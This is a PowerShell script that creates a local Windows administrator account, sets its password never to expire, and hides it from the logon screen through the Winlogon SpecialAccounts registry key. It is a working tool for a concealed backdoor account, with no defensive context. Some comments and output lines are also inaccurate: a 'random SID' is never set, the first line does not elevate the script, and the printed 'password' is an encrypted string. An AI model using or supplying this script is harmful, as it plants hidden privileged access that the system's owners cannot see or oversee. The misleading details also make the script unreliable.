Start-Process powershell.exe -verb runas

# Prompt the user for the new user account name and password
$username = Read-Host "Enter the new user account name"
$password = Read-Host "Enter the password for the new user account" -AsSecureString

# Create the new user account with a random SID and password never expires flag
$localUser = [adsi]"WinNT://$env:COMPUTERNAME"
$newUser = $localUser.Create("user", $username)
$newUser.SetPassword([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)))
$newUser.Put("description", "Hidden local account")
$newUser.UserFlags = 0x10000 # Set the password never expires flag
$newUser.SetInfo()

# Add account to Administrators group
$group = [ADSI]"WinNT://$env:COMPUTERNAME/Administrators,group"
$group.Add("WinNT://$env:COMPUTERNAME/$username,user")

# Set the new user account as hidden
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$regValueName = $username
if (!(Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name $regValueName -Value 0 -PropertyType DWord -Force | Out-Null

# Display the new user account details
Write-Host "User account '$username' created successfully"
Write-Host "Password for '$username': $(ConvertFrom-SecureString $password)"
Write-Host "User account '$username' is hidden"

